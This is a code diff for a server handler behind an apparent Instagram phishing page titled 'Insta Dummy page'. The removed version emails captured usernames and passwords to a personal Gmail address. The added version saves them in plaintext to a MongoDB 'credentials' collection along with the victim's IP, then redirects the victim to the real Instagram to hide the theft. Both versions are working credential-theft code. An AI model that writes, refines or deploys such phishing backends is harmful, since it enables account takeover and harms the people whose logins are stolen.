@@ -1,4 +1,6 @@
-import nodemailer from 'nodemailer';
+import { MongoClient } from 'mongodb';
+
+const MONGODB_URI = process.env.MONGODB_URI;
 
 export default async function handler(req, res) {
   // Only accept POST requests
@@ -13,38 +15,41 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Please enter correct username or password. Try again' });
   }
 
-  // Check if environment variables are set
-  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASSWORD) {
-    console.error('Missing EMAIL_USER or EMAIL_PASSWORD environment variables');
-    return res.status(500).json({ error: 'Server configuration error. Please check environment variables.' });
+  // Check if MongoDB URI is set
+  if (!MONGODB_URI) {
+    console.error('Missing MONGODB_URI environment variable');
+    return res.status(500).json({ error: 'Server configuration error' });
   }
 
+  let client;
   try {
-    // Configure your email service
-    const transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASSWORD,
-      },
+    client = new MongoClient(MONGODB_URI);
+    await client.connect();
+
+    const database = client.db('insta_login');
+    const logins = database.collection('credentials');
+
+    // Save credentials to database
+    const result = await logins.insertOne({
+      username: u_name,
+      password: pass,
+      timestamp: new Date(),
+      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
     });
 
-    const mailOptions = {
-      from: process.env.EMAIL_USER,
-      to: 'remeriu02@gmail.com',
-      subject: 'Someone Login ! Insta Dummy page',
-      text: `Username: ${u_name}\r\nPassword: ${pass}`,
-    };
+    console.log('Credentials saved:', result.insertedId);
 
-    await transporter.sendMail(mailOptions);
-
-    // Redirect to Instagram after sending
+    // Return success
     return res.status(200).json({ 
       success: true, 
       redirect: 'https://www.instagram.com' 
     });
   } catch (error) {
-    console.error('Email error:', error);
+    console.error('Database error:', error);
     return res.status(500).json({ error: `Unable to process request: ${error.message}` });
+  } finally {
+    if (client) {
+      await client.close();
+    }
   }
 }
